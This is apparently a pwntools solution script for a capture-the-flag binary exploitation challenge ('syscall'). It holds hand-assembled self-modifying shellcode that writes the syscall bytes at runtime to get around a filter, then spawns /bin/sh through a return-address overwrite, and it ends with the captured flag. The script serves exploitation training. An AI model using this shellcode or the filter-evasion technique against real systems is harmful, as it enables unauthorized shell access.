from pwn import *

r = remote("actf.jinblack.it", 4001)
'''
r = process("./syscall")
gdb.attach(r, """
    b *0x404081
    c
    """)
'''
input("wait")

# code will be written in the bss buffer
buffer = 0x404080

# There is a check for syscals (\x0F\x05)
# need a shellcode that writes the syscall, so that \x0F\x05 are not in the string
'''
mov rdi, 0x4040ae
mov rax, 0x3b
mov BYTE PTR[0x4040ac], 0x0F
mov BYTE PTR[0x4040ad], 0x05
xor rsi, rsi
xor rdx, rdx
#syscall written here
'''
shellcode = b"\x48\xC7\xC7\xAE\x40\x40\x00\x48\xC7\xC0\x3B\x00\x00\x00\xC6\x04\x25\xAC\x40\x40\x00\x0F\xC6\x04\x25\xAD\x40\x40\x00\x05\x48\x31\xF6\x48\x31\xD2\x90\x90"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

payload = b"\x90" * 8 + shellcode + b"\x90" * (216-len(shellcode)-8) + p64(buffer)

r.send(payload)

r.interactive()

#flag{nice_job!_self_modifying_shellcode?}

